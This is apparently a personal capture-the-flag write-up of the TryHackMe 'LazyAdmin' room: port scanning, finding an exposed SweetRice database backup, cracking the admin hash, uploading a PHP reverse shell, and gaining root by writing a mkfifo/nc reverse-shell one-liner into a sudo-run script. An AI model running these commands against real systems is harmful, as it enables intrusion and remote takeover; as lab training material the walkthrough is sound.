The first capstone is this one:
- [https://tryhackme.com/r/room/lazyadmin](https://tryhackme.com/r/room/lazyadmin)

# NMAP scan
first of all we need to do a `nmap` scan:
```bash
nmap -T4 -p- -A HOST_IP
```
- ![[Pasted image 20250120115505.png]]
- we have just two ports `ssh` and `http`


# Website enumeration
So we start to enumerate the website on port `80`:
```bash
python3 dirsearch.py -u http://HOST_IP -e php,html -x 400, 401, 403
```
- ![[Pasted image 20250120115642.png]]

There is a `/content` folder, so we visit it:![[Pasted image 20250120115716.png]]

We have `SweetRice` installed, so we search for exploits on google:
- ![[Pasted image 20250120115753.png]]


# sql backup exploit
There is an exploit that gives us the access on the `mysql` backup file.
- ![[Pasted image 20250120115900.png]]

So we try to visit it under the folder `/content`:
```url
/content/inc/mysql_backup
```
- ![[Pasted image 20250120115944.png]]

We open it and we can find the password hash about `admin` user:
- ![[Pasted image 20250120120038.png]]


## Cracking hash password
At this point we go on `CrackStation` and we cracke the hash:
- ![[Pasted image 20250120120147.png]]

The password is `Password123`


# arbitrary file upload exploit
We can study this exploit and we can see that it performs a login on the page `/as/` so we take this info:
- ![[Pasted image 20250120120600.png]]


So we can do it manually at all.
In fact we can visit `/content/as`:
- ![[Pasted image 20250120120651.png]]

We login as `admin:Password123`.


We go on `MediaCenter`:
- ![[Pasted image 20250120120749.png]]


So we download the reverse shell in php:
- [https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php)

And we change the IP and the port on it:
- ![[Pasted image 20250120120917.png]]

Now we run a `nc` listener on our machine:
```bash
nc -nvlp 7777
```

And we upload the file:
- ![[Pasted image 20250120121011.png]]

We click on it and we get a shell:
- ![[Pasted image 20250120121031.png]]


# Privilege escalation
We start with `sudo` checks:
```bash
sudo -l
```
- ![[Pasted image 20250120121110.png]]
- we can run with no password `perl` on a backup script

We give a look at this script:
```bash
cd /home/itguy

cat backup.plp
```
- ![[Pasted image 20250120121225.png]]


So it executes `copy.sh` script...

Let's see what it contains:
```bash
cat /etc/copy.sh
```
- ![[Pasted image 20250120121328.png]]
- it executes a reverse shell on an `192.168.0.190`


So we can try to insert into this `.sh` a new line with a reverse shell to our machine on the same port:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc OUR_IP 5554 >/tmp/f" > /etc/copy.sh
```
- ![[Pasted image 20250120121623.png]]
- it allowed us to insert the line

So we want to run `backup.pl` as `root` with `sudo`. This will run `copy.sh` as root too and we gain a `root` shell.


We set a listener on our machine:
```bash
nc -nlvp 5554
```

And then we run the `backup.pl` script:
```bash
sudo perl /home/itguy/backup.pl
```


And we got a `root` shell:
- ![[Pasted image 20250120121911.png]]

